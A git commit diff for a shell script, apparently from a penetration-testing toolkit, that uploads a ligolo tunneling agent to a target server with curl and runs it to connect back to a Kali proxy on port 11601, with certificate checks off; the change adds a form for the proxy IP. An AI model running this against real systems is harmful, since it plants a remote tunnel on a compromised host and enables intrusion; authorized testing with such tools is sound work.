bbab7ce1bfd88b9b1b159f9b1ef3004a4e48eaaa
Danny van der Knaap <dvdknaap@users.noreply.github.com>
2025-04-06 08:23:07 -0400

    feat(bash): new scripts (#138)

--- code/xdotool/scripts/portListening/ligolo/curl_ligolo_agent.sh
+++ code/xdotool/scripts/portListening/ligolo/curl_ligolo_agent.sh
@@ -4,11 +4,19 @@
 download ligolo agent to server and connect to proxy
 '
 
+# Generate GUI form items (label, type (optional: default text), name, default (optional))
+PROXY_IP_FIELD=$(form_item  "proxy ip" "proxy_ip" "${KALI_IP}")
+
+# Generate GUI form
+generate_form "${PROXY_IP_FIELD}"
+
+PROXY_IP=${form_data["proxy_ip"]}
+
 LOCATION="${SCRIPTS_DIR}/portListening/ligolo/.files"
 FILE="agent"
 
 curl_upload_file "${LOCATION}" "${FILE}"
 sleep 3
 
-execute_command "${FILE_LOCATION} -connect ${KALI_IP}:11601 -ignore-cert"
+execute_command "${FILE_LOCATION} -connect ${PROXY_IP}:11601 -ignore-cert"
 create_new_line
